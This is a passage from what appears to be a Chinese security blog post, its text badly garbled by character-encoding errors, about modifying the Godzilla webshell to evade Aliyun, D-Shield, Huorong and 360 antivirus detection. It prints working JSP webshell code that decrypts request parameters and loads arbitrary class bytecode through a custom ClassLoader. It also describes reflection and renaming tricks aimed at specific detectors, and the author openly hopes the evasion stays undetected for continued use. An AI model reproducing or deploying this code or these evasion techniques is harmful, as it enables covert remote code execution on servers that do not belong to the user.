alt="image-20241122152725481"></p><p>aesä¹Ÿæœ‰é—®é¢˜ã€‚ok,ä¹Ÿç»™ä»–ç¼–ç ä¸€ä¸‹ï¼Œä¸‹åŠéƒ¨åˆ†ä¹Ÿæœ‰é—®é¢˜ï¼Œæ”¹æ”¹ã€‚<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241122155044933.png" alt="image-20241122155044933"></p><p>æˆ‘ä»¬åœ¨æ”¹è¿™ä¸ªçš„æ—¶å€™å‘ç°å°±ç®—æœ‰è¿™ä¸€å¥ï¼Œä¹ŸæŠ¥å·²çŸ¥ï¼Œé‚£è¯´æ˜ï¼Œè¿™ä¸ªé‡Œé¢çš„\uå•¥å•¥å•¥çš„ä¹Ÿè¢«æ ‡è®°äº†ã€‚</p><p>æˆ‘ä»¬åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°é˜¿é‡Œäº‘æ‹¦æˆªçš„ï¼Œ<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125100859587-17325005401581.png" alt="image-20241125100859587"></p><p>è¿™ç§åå°„åŠ è½½ç±»çš„   invokeæ–¹å¼è‚¯å®šæ˜¯è¢«æ‹¦æˆªçš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è®©gptå¸®æˆ‘ä»¬å†™ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101509813.png" alt="image-20241125101509813"></p><p>å°±ç±»ä¼¼äºè¿™ç§ã€‚è¿™æ ·çš„è¯ï¼Œé˜¿é‡Œäº‘å°±ä¸æŠ¥äº†ã€‚</p><p>åŸæœ¬çš„å“¥æ–¯æ‹‰åˆ†ä¸¤åŠéƒ¨åˆ†ï¼Œä¸Šéƒ¨åˆ†ä¸ºå®šä¹‰çš„å„ç§æ–¹æ³•ã€‚å¦‚md5 base64 en decode  aesç­‰ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101657763.png" alt="image-20241125101657763"></p><p>ä¸‹åŠéƒ¨åˆ†ä¸ºï¼Œæ­£çœŸçš„ä¼ å‚é€»è¾‘ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101749460.png" alt="image-20241125101749460"></p><p>æˆ‘ä»¬è®©gptå¸®æˆ‘ä»¬æ”¹ä¸€ä¸‹ï¼Œä¸ŠåŠéƒ¨åˆ†ï¼Œç”¨åå°„æœºåˆ¶ï¼Œå¹¶ä¸”é¿å…invokeå‡ºç°ã€‚</p><p>å·¦è¾¹ä¸ºæ²¡æœ‰ä¸‹ç­éƒ¨åˆ†ï¼Œå³è¾¹æ˜¯æœ‰çš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125101919130.png" alt="image-20241125101919130"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸ŠåŠéƒ¨åˆ†å·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼Œä¸‹åŠéƒ¨åˆ†è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œæ”¾ä¸€ä¸‹ğŸã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125102230478.png" alt="image-20241125102230478"></p><p>é˜¿é‡Œäº‘ä¹ŸæŠ¥ï¼Œä»–æ˜¯æŠ¥çš„f.equals(pageContext);ã€‚é‚£æˆ‘ä»¬å†æ”¹ä¸€ä¸‹ã€‚ğŸçš„æ ¸å¿ƒé€»è¾‘ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! </span><br><span class="line">    String xc = <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; </span><br><span class="line">    String pass = <span class="string">&quot;pass&quot;</span>; </span><br><span class="line">    String md5 = md5(pass + xc); </span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">X</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">X</span><span class="params">(ClassLoader z)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(z);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">       <span class="function"><span class="keyword">public</span> Class <span class="title">Q</span><span class="params">(<span class="keyword">byte</span>[] cb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.defineClass(<span class="keyword">null</span>, cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="comment">// å¯ä»¥åœ¨è¿™é‡Œæ•è·å¹¶å¤„ç†å¼‚å¸¸</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] x(<span class="keyword">byte</span>[] s, <span class="keyword">boolean</span> m) &#123; </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// è·å– Cipher ç±»</span></span><br><span class="line">        Class&lt;?&gt; cipherClass = Class.forName(<span class="string">&quot;javax.crypto.Cipher&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– Cipher.getInstance(&quot;AES&quot;) æ–¹æ³•å¹¶è°ƒç”¨</span></span><br><span class="line">        java.lang.reflect.Method getInstanceMethod = cipherClass.getMethod(<span class="string">&quot;getInstance&quot;</span>, String.class);</span><br><span class="line">        Object cipher = getInstanceMethod.invoke(<span class="keyword">null</span>, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– SecretKeySpec ç±»å¹¶åˆ›å»ºå¯¹è±¡</span></span><br><span class="line">        Class&lt;?&gt; secretKeySpecClass = Class.forName(<span class="string">&quot;javax.crypto.spec.SecretKeySpec&quot;</span>);</span><br><span class="line">        java.lang.reflect.Constructor&lt;?&gt; secretKeySpecConstructor = secretKeySpecClass.getConstructor(<span class="keyword">byte</span>[].class, String.class);</span><br><span class="line">        Object key = secretKeySpecConstructor.newInstance(xc.getBytes(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– Cipher.init æ–¹æ³•å¹¶è°ƒç”¨</span></span><br><span class="line">        java.lang.reflect.Method initMethod = cipherClass.getMethod(<span class="string">&quot;init&quot;</span>, <span class="keyword">int</span>.class, java.security.Key.class);</span><br><span class="line">        initMethod.invoke(cipher, m ? <span class="number">1</span> : <span class="number">2</span>, key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å– Cipher.doFinal æ–¹æ³•å¹¶è°ƒç”¨</span></span><br><span class="line">        java.lang.reflect.Method doFinalMethod = cipherClass.getMethod(<span class="string">&quot;doFinal&quot;</span>, <span class="keyword">byte</span>[].class);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">byte</span>[]) doFinalMethod.invoke(cipher, (Object) s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">md5</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        String ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.MessageDigest m;</span><br><span class="line">            m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">            ret = <span class="keyword">new</span> java.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ java.util.Base64</span></span><br><span class="line">            java.util.Base64.Encoder encoder = java.util.Base64.getEncoder();</span><br><span class="line">            <span class="keyword">return</span> encoder.encodeToString(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é¿å… invoke ç›´æ¥ä½¿ç”¨ Base64 ç±»</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String bs) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ java.util.Base64</span></span><br><span class="line">            java.util.Base64.Decoder decoder = java.util.Base64.getDecoder();</span><br><span class="line">            <span class="keyword">return</span> decoder.decode(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜ï¼Œå°±å¥½æ”¹äº†ã€‚</p><p>æˆ‘ä»¬ç›´æ¥åœ¨dç›¾å¤„åˆ äº†  é˜¿é‡Œäº‘æŠ¥çš„  f.æ˜¯ä¸è¡Œçš„ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125103728559.png" alt="image-20241125103728559"></p><p>æ”¹äº†ä¸€ä¸‹å˜é‡åï¼Œä¹Ÿä¸è¡Œã€‚</p><p>ç»è¿‡ä¸€å¤©çš„æµ‹è¯•ï¼Œå‘ç°ï¼Œå¥½åƒç»•ä¸è¿‡é˜¿é‡Œäº‘äº†ã€‚ï¼Œå¤ªèœäº†ã€‚å…ˆè¿™æ ·ã€‚</p><p>aliyunä¼šåŒ¹é…f.equals(pageContext);</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125172132547.png" alt="image-20241125172132547"></p><p>æ”¹æˆunicodeä¹Ÿä¸è¡Œï¼Œaliyunæ˜¯åŠ¨æ€çš„ï¼Œä»–ä¼šè¿è¡Œã€‚å…¶ä»–çš„éƒ½ç”¨åå°„å†™å¥½äº†ã€‚</p><p>å“¦ï¼Œå¯¹äº†ï¼Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è¿™ä¸ªdefineClass(null, cb, 0, cb.length);æ–¹æ³•ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125175603511.png" alt="image-20241125175603511"></p><p><a href="https://xz.aliyun.com/t/11368">https://xz.aliyun.com/t/11368</a></p><p>åœ¨è¿™ç¯‡å¤§å¸ˆå‚…çš„æ–‡ç« ä¸­ï¼Œè¯¦ç»†è¯´äº†è¿™ä¸ªï¼Œå“¥æ–¯æ‹‰å’Œå†°èéƒ½æ˜¯è¿™æ ·çš„éœ€è¦defineClassæ–¹æ³•æ¥åŠ è½½æ¶æ„ç±»å­—èŠ‚ç ï¼Œä¼¼ä¹éœ€è¦è‡ªå®šä¹‰ClassLoaderæ¥ç»•è¿‡äº†ã€‚æˆ–è€…æ”¹payloadäº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180907351.png" alt="image-20241125180907351"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241125180031255.png" alt="image-20241125180031255"></p><p>ä¸‹é¢çš„è¯„è®ºä¸­ï¼Œä¹Ÿå†™äº†ï¼Œå•æ–‡ä»¶ä¸å¥½è¿‡é˜¿é‡Œäº‘äº†ã€‚éœ€è¦åˆ†ç¦»äº†ã€‚ç¬”è€…å¤ªèœäº†ï¼Œåé¢åœ¨ç ”ç©¶ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸‹åŠéƒ¨åˆ†ï¼Œåœ¨çœ‹äº†å¤§é‡å“¥æ–¯æ‹‰å…æ€é©¬çš„æ•™ç¨‹åå‘ç°ï¼Œdç›¾æˆ‘ä¹Ÿæ²¡è¿‡å»ã€‚ä¸‹é¢å°±è®°å½•ä¸€ä¸‹ã€‚</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] data = base64Decode(request.getParameter(pass));</span><br><span class="line">        data = x(data, <span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">&quot;payload&quot;</span>, <span class="keyword">new</span> X(<span class="keyword">this</span>.getClass().getClassLoader()).Q(data));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;parameters&quot;</span>, data);</span><br><span class="line">            java.io.ByteArrayOutputStream arrOut = <span class="keyword">new</span> java.io.ByteArrayOutputStream();</span><br><span class="line">            Object f = ((Class) session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();</span><br><span class="line">            f.equals(arrOut);</span><br><span class="line">            f.equals(pageContext);</span><br><span class="line"></span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">            f.toString();</span><br><span class="line">            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="keyword">true</span>)));</span><br><span class="line">            response.getWriter().write(md5.substring(<span class="number">16</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸‹åŠéƒ¨åˆ†ï¼Œä¸»è¦çš„æŸ¥æ€ç‚¹æ˜¯<code>session.setAttribute(&quot;payload&quot;, new X(this.getClass().getClassLoader()).Q(data));</code></p><p>å‡†ç¡®çš„æ¥è¯´æ˜¯getClassLoaderè¿™ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126114939630.png" alt="image-20241126114939630"></p><p>è¿™é‡Œç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²åˆ æ‰ï¼Œå®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚</p><p><a href="https://www.freebuf.com/sectool/386231.html">https://www.freebuf.com/sectool/386231.html</a></p><p>åœ¨è¿™ç¯‡å¤§å¸ˆå‚…çš„æ–‡ç« ä¸­è¯´ï¼Œå°†<code>this.getClass().getClassLoader() å¯æ›¿æ¢ä¸ºThread.currentThread().getContextClassLoader()</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115039932.png" alt="image-20241126115039932"></p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬æƒŠå¥‡çš„å‘ç°ï¼ŒgetContextClassLoader()  ä¹Ÿæ˜¯å­˜åœ¨ClassLoader æ‰€ä»¥è¿‡ä¸å»ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115332909.png" alt="image-20241126115332909"></p><p>ä¸ºäº†gptï¼Œå‘ç°ï¼Œæ— è®ºæ€ä¹ˆè·å–ï¼Œéƒ½éœ€è¦æœ‰ClassLoader()è¿™ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±èµ°åˆ°äº†æ­»èƒ¡åŒã€‚</p><p>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œå°±æ˜¯è‡ªå·±å†™äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæä¸‹ï¼Œåé¢åœ¨ç ”ç©¶ï¼ˆå…¶å®å°±æ˜¯ç¬”è€…ä¸ä¼šï¼Œç­‰æˆ‘ç ”ç©¶ç ”ç©¶çš„ï¼‰ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115454282.png" alt="image-20241126115454282"></p><p>é‚£ä¹ˆè¿˜æœ‰ä¸€ç§æ–¹æ³•å°±æ˜¯æ··æ·†äº†ï¼Œæ··æ·†å°±æ˜¯ç”¨unicodeç¼–ç ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126115901247.png" alt="image-20241126115901247"></p><p>ä½†æ˜¯ä½ ä¼šå‘ç°ï¼Œæœ‰unicodeç¼–ç ã€‚  ç›´æ¥å°±æŠ¥ï¼Œä¹Ÿä¸ç®¡é‡Œé¢æ˜¯å•¥ã€‚æ‰€ä»¥æš‚æ—¶æˆ‘çš„è·¯ç»™å µæ­»äº†ã€‚</p><p>æœ€åæˆ‘ä»¬å°±ç”¨unicodeç¼–ç å§ï¼ŒæŠ¥å°±æŠ¥å§ï¼Œæ€»æ¯”æŠ¥å¯ç–‘å¥½çœ‹ä¸€ç‚¹ã€‚</p><p>è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬çš„æ¨¡æ¿å°±å†™å¥½äº†ã€‚</p><p>è¯•è¯•ç«ç»’å’Œ360 ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145648688.png" alt="image-20241126145648688"></p><p>è¿™é‡Œä¼ å€¼çš„æ—¶å€™ï¼Œæ˜¯payloadå°±ä¸è¡Œï¼Œç«ç»’å’Œ360éƒ½æŠ¥ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241126145952249.png" alt="image-20241126145952249"></p><p>éšä¾¿å†™ä¸ªå­—ç¬¦ä¸²ï¼Œå³å¯äº†ã€‚åœ¨æ”¹æ”¹å˜é‡åï¼Œå°±ä¸æ¼”ç¤ºäº†ã€‚å¥½ï¼Œè¿™ä¸€æˆ‘ä»¬çš„æ¨¡æ¿å°±å½»åº•å®Œäº‹äº†ã€‚</p><p>æ”¾åˆ°å“¥æ–¯æ‹‰é‡Œçš„binæ–‡ä»¶å°±è¡Œã€‚</p><p>å½“ç„¶ï¼Œæˆ‘ä»¬çš„binæ–‡ä»¶éœ€è¦æ”¹ä¸€æ”¹ã€‚ç”±äºï¼Œå“¥æ–¯æ‹‰é»˜è®¤jspå½¢å¼çš„ç”Ÿæˆä»£ç æ˜¯ä¸¤æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦éƒ½æ”¹ä¸€ä¸‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127112917794.png" alt="image-20241127112917794"></p><p>æŠŠè¿™äº›strå†™ä¸€ä¸‹ï¼Œåœ¨ä¸»generateä¸­ï¼Œå†™ä¸€äº›å­—ç¬¦ä¸²ï¼Œç„¶ååœ¨ç”Ÿæˆä»£ç æ—¶å€™è¿›è¡Œæ›¿æ¢å°±å¯ä»¥äº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113002060.png" alt="image-20241127113002060"></p><p>è¿™ä¸ªæ´»çœ‹èµ·æ¥ç¡®å®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯éœ€è¦å¾ˆç»†ï¼Œæ”¹äº†ä¸€å¤©ï¼Œé”™ä¸€ç‚¹åˆè¦é‡æ–°åˆ äº†åœ¨æ›¿æ¢ï¼Œå¿ƒæ€å¿«å´©äº†ã€‚</p><p>è¿™é‡Œç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°ï¼Œæˆ‘å°†åŸæœ¬é»˜è®¤çš„å“¥æ–¯æ‹‰ç”Ÿæˆçš„pass å’Œ keyè¿›è¡Œbase64äº†ã€‚</p><p>å°±æ˜¯åœ¨è¿™ä¸ªåœ°æ–¹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113248451.png" alt="image-20241127113248451"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113341743.png" alt="image-20241127113341743"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113548405.png" alt="image-20241127113548405"></p><p>åœ¨ç”Ÿæˆæœ¨é©¬ä¸­ï¼Œå°±æ‰¾ä¸åˆ°åŸæ¥çš„pass å’Œä¸€ä¸ª16ä½çš„å­—ç¬¦äº†ï¼Œå¢åŠ ä¸€ä¸¢ä¸¢è¿·æƒ‘æ€§å§</p><p>åŸæœ¬çš„é©¬ä¸­ï¼Œæ˜¯æœ‰md5å‡½æ•°çš„ï¼Œä½†æ˜¯è¿™ä¸ªæ²¡æœ‰ï¼Œå› ä¸ºç”¨ä¸åˆ°ï¼Œå°±ç»™åˆ äº†ã€‚</p><p>å½“ç„¶ï¼Œå…¶ä¸­ä¹ŸåŠ äº†ä¸€äº›å…¶ä»–çš„ä¸œè¥¿ã€‚è¿™é‡Œå°±ä¸ç»†è®²äº†ï¼Œé˜²æ­¢æš´æ¼ï¼Œèƒ½è®©å¤§å®¶å¤šç”¨ä¸€ä¼šã€‚</p><p>å›åˆ°å…æ€ï¼Œæ˜¯çš„ï¼Œä¹Ÿè¿‡æ‰äº†dç›¾ï¼Œç¬”è€…ä¸Šé¢è¯´åˆ°çš„  gptå¸®æˆ‘ä»¬æ‰¾äº†ä¸€äº›å‡½æ•°ï¼Œä½†æ˜¯éƒ½æœ‰classcload è¿‡ä¸å»ï¼Œå…¶å®ä¸æ˜¯ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œè¿™ä¸ªæ˜¯æœ‰å¯ä»¥ä»£æ›¿çš„ã€‚gptå¤ªå¼ºäº†ã€‚è¿™é‡Œå°±ä¸å†™æ”¹è¿‡å“ªé‡Œäº†ã€‚å¤§å®¶ä¸‹è½½äº†ç›´æ¥ç”¨å°±å¥½ã€‚ä¸‹ä¸ªç‰ˆæœ¬åœ¨æ­éœ²ï¼Œç›®å‰æˆ‘çœ‹ç½‘ä¸Šè¿˜æ²¡æœ‰è¿™ç§ç”¨æ³•ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127113840202.png" alt="image-20241127113840202"></p><p>è¿™æ ·å‘¢ï¼Œæˆ‘ä»¬å°±è¿‡æ‰äº†dç›¾ï¼Œå¸Œæœ›dç›¾çš„ä½œè€…ä¸è¦çœ‹åˆ°è¿™ä¸ªæ–‡ç« ï¼Œè¿™æ ·çš„è¯ï¼Œå°±èƒ½ä¸€ç›´ç”¨äº†ã€‚</p><p>å¥½äº†ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚æš‚æ—¶å…ˆç”¨ç€ï¼Œçœ‹ä¸‹æ•ˆæœã€‚</p><p>æ²¡æ¬¡ç”Ÿæˆçš„</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127135106715.png" alt="image-20241127135106715"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142342625.png" alt="image-20241127142342625"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142358575-17326886738532.png" alt="image-20241127142358575"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241127142435205.png" alt="image-20241127142435205"></p><p>okï¼Œæ²¡æœ‰é—®é¢˜ï¼Œè¿™æ ·jspçš„å…æ€å°±å®Œæˆäº†ã€‚å¤§å®¶åœ¨ä½¿ç”¨çš„æ—¶å€™ï¼Œå°½é‡åˆ«ç”¨pass å’Œkeyåšå¯†ç ï¼Œå¤ªæ˜æ˜¾äº†ã€‚ä¸‹é¢å’±ä»¬æ¥çœ‹aspçš„ã€‚</p><h5 id="asp-å…æ€"><a href="#asp-å…æ€" class="headerlink" title="asp å…æ€"></a>asp å…æ€</h5><p>å…ˆçœ‹ä¸€ä¸‹åŸç‰ˆçš„ğŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 